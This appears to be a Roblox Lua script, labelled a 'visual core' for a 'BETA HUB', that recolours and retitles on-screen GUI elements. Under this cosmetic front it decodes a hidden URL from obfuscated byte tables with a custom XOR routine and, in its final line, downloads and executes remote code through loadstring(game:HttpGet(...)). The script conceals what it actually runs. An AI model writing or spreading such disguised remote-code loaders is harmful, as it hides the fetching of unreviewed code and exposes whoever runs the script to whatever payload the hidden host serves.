
--[[ STAGE 2: VISUAL CORE ]]
local AeBqm6FpnhMc9ZQl = bit32 and bit32.bxor
if not AeBqm6FpnhMc9ZQl then
    AeBqm6FpnhMc9ZQl = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function xn_7RuIY6Y3uHiACZvL(data, a, b, m, s, r)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local step = (b + i * s) % 256
        if m == 0 then
            v = (v - step) % 256
            v = AeBqm6FpnhMc9ZQl(v, a)
        else
            v = AeBqm6FpnhMc9ZQl(v, a)
            v = (v - step) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local Y0o_jK72s020LEf_vx = {
  {{174, 164, 170, 155}, 122, 106, 1, 1, true, 12},
  {{221, 198, 218, 182, 186, 180}, 117, 56, 1, 7, false, 19},
  {{206, 241, 228, 33, 2, 237}, 238, 72, 0, 6, false, 10},
  {{234, 45, 38, 47, 41}, 166, 28, 1, 1, false, 14},
  {{238, 196, 255}, 161, 236, 1, 2, true, 24},
  {{129, 143, 136}, 164, 173, 1, 5, true, 13},
  {{145, 93, 84}, 229, 193, 0, 5, true, 3},
  {{133, 145, 140}, 61, 67, 1, 3, false, 21},
  {{142, 167, 175, 169, 174}, 78, 124, 0, 7, false, 18},
  {{7, 65, 126}, 92, 228, 1, 5, true, 2},
  {{187, 202, 176, 0, 180}, 197, 16, 0, 2, false, 17},
  {{77, 56, 63, 74, 80, 158}, 214, 136, 0, 7, false, 1},
  {{224, 188, 255, 250, 227, 177, 200}, 45, 92, 1, 3, true, 7},
  {{189, 162, 240, 0, 0, 185, 192}, 110, 133, 0, 7, false, 22},
  {{16, 26, 24}, 37, 206, 0, 2, false, 9},
  {{96, 122, 105, 116, 132}, 179, 154, 0, 5, true, 5},
  {{45, 42, 134}, 30, 247, 0, 6, true, 23},
  {{105, 119, 26, 29}, 218, 64, 1, 6, true, 8},
  {{46, 59, 48, 64, 71, 81}, 152, 50, 0, 6, true, 6},
  {{150, 144, 152, 150}, 88, 88, 0, 5, true, 16},
  {{122, 23, 28, 6, 58}, 223, 114, 1, 4, false, 15},
  {{106, 139, 154}, 66, 84, 0, 5, false, 20},
  {{53, 40, 44, 30}, 92, 246, 0, 1, false, 11},
  {{112, 146, 123, 155, 150}, 117, 107, 0, 5, true, 4}
}
local pYIAVmLUH7egLc_7H6Z5 = {}
for TC29gBYwNDjio2CC4suy6Zp = 1, #Y0o_jK72s020LEf_vx do
    local rbCsCzREh9JEsAtvNd = Y0o_jK72s020LEf_vx[TC29gBYwNDjio2CC4suy6Zp]
    pYIAVmLUH7egLc_7H6Z5[rbCsCzREh9JEsAtvNd[7]] = xn_7RuIY6Y3uHiACZvL(rbCsCzREh9JEsAtvNd[1], rbCsCzREh9JEsAtvNd[2], rbCsCzREh9JEsAtvNd[3], rbCsCzREh9JEsAtvNd[4], rbCsCzREh9JEsAtvNd[5], rbCsCzREh9JEsAtvNd[6])
end
local CYVsmdJC1q8aJjAsOmLZmE = table.concat(pYIAVmLUH7egLc_7H6Z5)
local HubName = "BETA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(CYVsmdJC1q8aJjAsOmLZmE))()
